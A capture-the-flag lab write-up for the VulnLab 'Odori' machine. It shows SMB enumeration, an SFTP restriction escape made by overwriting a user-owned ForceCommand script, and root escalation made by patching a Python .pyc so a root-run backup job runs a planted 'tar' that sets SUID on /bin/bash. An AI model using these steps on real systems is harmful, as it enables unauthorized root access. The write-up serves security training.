## Overview

Odori is a Linux machine that exposes SSH and SMB. The initial foothold comes from a readable SMB backup share containing information that leads to a virtual disk image. Credentials recovered from the Windows VMDK can then be used to access the Linux host through SFTP.

The SFTP-only restriction can be bypassed because the `svc_backup` user owns the `/opt/restrict` script used by `sshd`. After gaining an interactive shell, the final privilege escalation abuses a Python `.pyc` file used by a scheduled backup process. By modifying the cached bytecode to execute a controlled `tar` binary, `/bin/bash` can be given the SUID bit and a root shell obtained.

> **Lab:** VulnLab / Odori  
> **Target:** `10.129.135.230`

---

## Enumeration

An initial Nmap scan reveals three interesting services:

```text
22/tcp  open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.15
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
```

The SMB enumeration shows an unauthenticated `backup` share:

```text
Disk       Permissions     Comment
----       -----------     -------
print$     NO ACCESS       Printer Drivers
backup     READ ONLY       Server Backups
IPC$       NO ACCESS       IPC Service (odori server (Samba, Ubuntu))
```

### SMB

Connect to the `backup` share:

```bash
smbclient \\\\10.129.135.230\\backup
```

Listing the share reveals `info.txt`:

```text
smb: \> ls
  .                                   D        0
  ..                                  D        0
  info.txt                            N       66
```

Download it:

```text
smb: \> get info.txt
```

The file contains:

```text
Please download the .vmdk file linked in the machine description.
```

The machine description points to the `odori.7z` archive containing a VMDK.

## Extracting the VMDK

Extract the archive with 7-Zip:

```bash
7z e odori.7z
```

The archive contains:

```text
file02.vmdk
```

The VMDK can then be attached and mounted for offline examination:

```bash
modprobe nbd
qemu-nbd --connect=/dev/nbd0 /root/file02.vmdk

mkdir /mnt/bitlocker
mkdir /mnt/windows

dislocker-fuse -V /dev/nbd0p3 -u /mnt/bitlocker
mount -o ro /mnt/bitlocker/dislocker-file /mnt/windows
```

The Windows filesystem contains DPAPI-protected credentials.

## SFTP Instead of SSH

Attempting a normal SSH login hangs because `svc_backup` is restricted to SFTP.

SFTP works:

```bash
sftp svc_backup@odori.vl
```

The SSH configuration reveals why:

```text
Match group svc_backup
    #ChrootDirectory /backup
    ForceCommand /opt/restrict /home/%u
    AllowTcpForwarding no
```

The important line is:

```text
ForceCommand /opt/restrict /home/%u
```

Download the `restrict` script:

```text
sftp> cd /opt
sftp> get restrict
```

Its contents are:

```bash
#!/bin/bash

/usr/lib/openssh/sftp-server -d $1
```

The critical finding is the ownership:

```text
-rwxrwxr-x 1 svc_backup root 48 Jan 11 19:44 restrict
```

The `svc_backup` account owns the script. Therefore, it can replace the script that SSH executes through `ForceCommand`.

---

## Escaping the SFTP Restriction

Replace the script with a shell invocation:

```bash
#!/bin/bash

#/usr/lib/openssh/sftp-server -d $1
bash
```

Upload the modified script:

```text
sftp> cd /opt
sftp> put restrict
```

Now connect over SSH:

```bash
ssh svc_backup@10.129.135.230
```

This time an interactive shell is obtained:

```text
svc_backup@odori:~$ whoami
svc_backup

svc_backup@odori:~$ hostname
odori
```

The user flag is located at:

```bash
cat ~/user.txt
```

## Privilege Escalation Enumeration

After obtaining the `svc_backup` shell, inspect the running processes with `pspy`.

The interesting process is related to the Python archiver:

```text
UID=1001 | /bin/bash /opt/restrict /home/%u
```

The archiver directory contains:

```text
/opt/archiver/
├── app.py
├── helper.py
└── __pycache__/
    └── helper.cpython-310.pyc
```

### `app.py`

```python
import os
from datetime import datetime, timedelta
from helper import tar_and_move_files

backup_dir = '/backup'
archive_dir = '/archive'
threshold_date = datetime.now() - timedelta(days=3*365)

def scan_and_archive_files():
    if not os.path.exists(archive_dir):
        os.makedirs(archive_dir)

    for root, dirs, files in os.walk(backup_dir):
        for file in files:
            file_path = os.path.join(root, file)
            file_mod_time = datetime.fromtimestamp(os.path.getmtime(file_path))

            if file_mod_time < threshold_date:
                print(f'Moving {file_path} to archive...')
                tar_and_move_files(file_path, archive_dir)
            else:
                print(f'{file_path} is not old enough to archive.')

if __name__ == '__main__':
    scan_and_archive_files()
```

### `helper.py`

```python
import os
import subprocess
from datetime import datetime

def tar_and_move_files(file_path, archive_dir):
    current_date = datetime.now().strftime('%Y-%m-%d')
    tar_filename = os.path.join(
        archive_dir,
        f'{current_date}_{os.path.basename(file_path)}.tar.gz'
    )

    subprocess.Popen([
        "/usr/bin/tar",
        "-czf",
        tar_filename,
        "-C",
        os.path.dirname(file_path),
        os.path.basename(file_path)
    ])

    os.remove(file_path)
```

The important part is:

```python
subprocess.Popen([
    "/usr/bin/tar",
    "-czf",
    ...
])
```

The scheduled process executes this code with elevated privileges.

## Abusing the Python `.pyc`

Python is using the cached bytecode:

```text
/opt/archiver/__pycache__/helper.cpython-310.pyc
```

Instead of modifying the source code, the string inside the bytecode can be changed so that the subprocess executes a controlled `tar` executable from `/tmp`.

```bash
sed -i 's|/usr/bin/tar|/tmp/bin/tar|' \
    helper.cpython-310.pyc
```

Create the replacement executable:

```bash
mkdir -p /tmp/bin

cat > /tmp/bin/tar <<'EOF'
#!/bin/bash
chmod u+s /bin/bash
EOF

chmod +x /tmp/bin/tar
```

The next requirement is to create a file old enough to satisfy the three-year condition in `app.py`:

```python
threshold_date = datetime.now() - timedelta(days=3*365)
```

Create an old file:

```bash
touch -d '2015-08-09 13:38:36.000000000 +0000' /backup/ancient
```

When the scheduled job processes the file, it calls the modified `tar` executable.

The result is that `/bin/bash` becomes SUID:

```text
-rwsr-xr-x 1 root root 1.4M Mar 14  2024 /bin/bash
```

## Root Shell

With the SUID bit set, execute Bash with preserved privileges:

```bash
/bin/bash -p
```

Verify the effective UID:

```bash
id
```

Output:

```text
uid=1001(svc_backup) gid=1001(svc_backup) euid=0(root) groups=1001(svc_backup)
```

Confirm the shell:

```bash
whoami
```

```text
root
```

The root flag is then available at:

```bash
cat /root/root.txt
```

## Key Takeaways

### 1. Anonymous SMB access can expose sensitive backup information

Even a read-only SMB share can provide enough information to pivot into another part of an environment.

### 2. Always inspect SSH restrictions

The `ForceCommand` directive is important when a user can authenticate but cannot obtain a normal shell.

```text
ForceCommand /opt/restrict /home/%u
```

A writable script referenced by `ForceCommand` can become a direct path to command execution.

### 3. Ownership matters more than permissions alone

The `restrict` script was executable by SSH but also writable by the restricted account itself. This made the restriction ineffective.

### 4. Python bytecode can matter during privilege escalation

Even when the `.py` source looks safe, a privileged process may execute a cached `.pyc`. If an attacker can modify the bytecode or its embedded strings, the runtime behavior can be changed.

### 5. Scheduled jobs are worth monitoring

`pspy` was useful for identifying the privileged process and understanding when the vulnerable archiving logic executed.
